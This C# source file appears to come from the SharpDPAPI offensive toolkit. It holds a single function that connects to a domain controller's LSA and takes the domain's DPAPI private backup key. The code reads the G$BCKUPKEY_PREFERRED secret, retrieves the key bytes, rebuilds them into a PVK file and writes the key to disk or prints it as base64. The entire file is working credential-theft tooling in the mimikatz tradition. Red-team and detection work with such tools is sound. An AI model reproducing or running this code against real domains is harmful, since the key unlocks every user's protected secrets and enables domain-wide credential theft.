using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpDPAPI
{
    public class Backup
    {
        public static void GetBackupKey(string system, string outFile = "")
        {
            // retrieves a DPAPI backup key from the given system (DC) specified
            //  saving the key to the specified output file

            // thanks to @gentilkiwi for this approach <3

            Interop.LSA_UNICODE_STRING aSystemName = new Interop.LSA_UNICODE_STRING(system);
            uint aWinErrorCode = 0;

            // initialize a pointer for the policy handle
            IntPtr LsaPolicyHandle = IntPtr.Zero;

            // these attributes are not used, but LsaOpenPolicy wants them to exists
            Interop.LSA_OBJECT_ATTRIBUTES aObjectAttributes = new Interop.LSA_OBJECT_ATTRIBUTES();
            aObjectAttributes.Length = 0;
            aObjectAttributes.RootDirectory = IntPtr.Zero;
            aObjectAttributes.Attributes = 0;
            aObjectAttributes.SecurityDescriptor = IntPtr.Zero;
            aObjectAttributes.SecurityQualityOfService = IntPtr.Zero;

            // get a policy handle to the target server's LSA w/ 'POLICY_GET_PRIVATE_INFORMATION' rights
            uint aOpenPolicyResult = Interop.LsaOpenPolicy(ref aSystemName, ref aObjectAttributes, (uint)Interop.LSA_AccessPolicy.POLICY_GET_PRIVATE_INFORMATION, out LsaPolicyHandle);
            aWinErrorCode = Interop.LsaNtStatusToWinError(aOpenPolicyResult);

            if (aWinErrorCode == 0x00000000)
            {
                IntPtr PrivateData = IntPtr.Zero;

                // the DPAPI secret name we need to resolve to the actual key name
                Interop.LSA_UNICODE_STRING secretName = new Interop.LSA_UNICODE_STRING("G$BCKUPKEY_PREFERRED");

                // grab the GUID of the G$BCKUPKEY_PREFERRED key
                uint ntsResult = Interop.LsaRetrievePrivateData(LsaPolicyHandle, ref secretName, out PrivateData);

                if (ntsResult != 0)
                {
                    uint winErrorCode = Interop.LsaNtStatusToWinError(ntsResult);
                    string errorMessage = new Win32Exception((int)winErrorCode).Message;
                    Console.WriteLine("  [X] Error calling LsaRetrievePrivateData {0} : {1}", winErrorCode, errorMessage);
                    return;
                }

                // copy out the GUID bytes
                Interop.LSA_UNICODE_STRING lusSecretData = (Interop.LSA_UNICODE_STRING)Marshal.PtrToStructure(PrivateData, typeof(Interop.LSA_UNICODE_STRING));
                byte[] guidBytes = new byte[lusSecretData.Length];
                Marshal.Copy(lusSecretData.buffer, guidBytes, 0, lusSecretData.Length);
                Guid backupKeyGuid = new Guid(guidBytes);
                Console.WriteLine("[*] Preferred backupkey Guid         : {0}", backupKeyGuid.ToString());

                // build the full name of the actual backup key
                string backupKeyName = String.Format("G$BCKUPKEY_{0}", backupKeyGuid.ToString());
                Console.WriteLine("[*] Full preferred backupKeyName     : {0}", backupKeyName);
                Interop.LSA_UNICODE_STRING backupKeyLSA = new Interop.LSA_UNICODE_STRING(backupKeyName);

                // retrieve the bytes of the full DPAPI private backup key
                IntPtr PrivateDataKey = IntPtr.Zero;
                uint ntsResult2 = Interop.LsaRetrievePrivateData(LsaPolicyHandle, ref backupKeyLSA, out PrivateDataKey);

                if (ntsResult2 != 0)
                {
                    uint winErrorCode = Interop.LsaNtStatusToWinError(ntsResult2);
                    string errorMessage = new Win32Exception((int)winErrorCode).Message;
                    Console.WriteLine("\r\n[X] Error calling LsaRetrievePrivateData ({0}) : {1}\r\n", winErrorCode, errorMessage);
                    return;
                }

                Interop.LSA_UNICODE_STRING backupKeyBytes = (Interop.LSA_UNICODE_STRING)Marshal.PtrToStructure(PrivateDataKey, typeof(Interop.LSA_UNICODE_STRING));

                /* backup key format -> https://github.com/gentilkiwi/mimikatz/blob/3134be808f1f591974180b4578a43aef1696089f/mimikatz/modules/kuhl_m_lsadump.h#L34-L39
                 typedef struct _KIWI_BACKUP_KEY {
	                    DWORD version;
	                    DWORD keyLen;
	                    DWORD certLen;
	                    BYTE data[ANYSIZE_ARRAY];
                    } KIWI_BACKUP_KEY, *PKIWI_BACKUP_KEY;
                */
                byte[] backupKey = new byte[backupKeyBytes.Length];
                Marshal.Copy(backupKeyBytes.buffer, backupKey, 0, backupKeyBytes.Length);

                byte[] versionArray = new byte[4];
                Array.Copy(backupKey, 0, versionArray, 0, 4);
                int version = BitConverter.ToInt32(versionArray, 0);

                byte[] keyLenArray = new byte[4];
                Array.Copy(backupKey, 4, keyLenArray, 0, 4);
                int keyLen = BitConverter.ToInt32(keyLenArray, 0);

                byte[] certLenArray = new byte[4];
                Array.Copy(backupKey, 8, certLenArray, 0, 4);
                int certLen = BitConverter.ToInt32(certLenArray, 0);

                byte[] backupKeyPVK = new byte[keyLen + 24];
                Array.Copy(backupKey, 12, backupKeyPVK, 24, keyLen);

                // PVK_FILE_HDR pvkHeader = { PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, byteLen };
                //  reference - https://github.com/gentilkiwi/mimikatz/blob/432276f23d7d2af12597e7847e268b751cc89dc5/mimilib/sekurlsadbg/kwindbg.h#L85-L92

                // PVK_MAGIC
                backupKeyPVK[0] = 0x1E;
                backupKeyPVK[1] = 0xF1;
                backupKeyPVK[2] = 0xB5;
                backupKeyPVK[3] = 0xB0;

                // AT_KEYEXCHANGE == 1
                backupKeyPVK[8] = 1;

                byte[] lenBytes = BitConverter.GetBytes((uint)keyLen);
                Array.Copy(lenBytes, 0, backupKeyPVK, 20, 4);

                if (String.IsNullOrEmpty(outFile))
                {
                    // base64 output
                    string base64Key = Convert.ToBase64String(backupKeyPVK);

                    Console.WriteLine("[*] Key :");
                    foreach (string line in Helpers.Split(base64Key, 80))
                    {
                        Console.WriteLine("          {0}", line);
                    }
                }
                else
                {
                    FileStream fs = File.Create(outFile);
                    BinaryWriter bw = new BinaryWriter(fs);
                    bw.Write(backupKeyPVK);

                    bw.Close();
                    fs.Close();

                    Console.WriteLine("[*] Backup key written to            : {0}", outFile);
                }

                Interop.LsaFreeMemory(PrivateData);
                Interop.LsaClose(LsaPolicyHandle);
            }
            else
            {
                string errorMessage = new Win32Exception((int)aWinErrorCode).Message;
                Console.WriteLine("\r\n[X] Error calling LsaOpenPolicy ({0}) : {1}\r\n", aWinErrorCode, errorMessage);
            }
        }
    }
}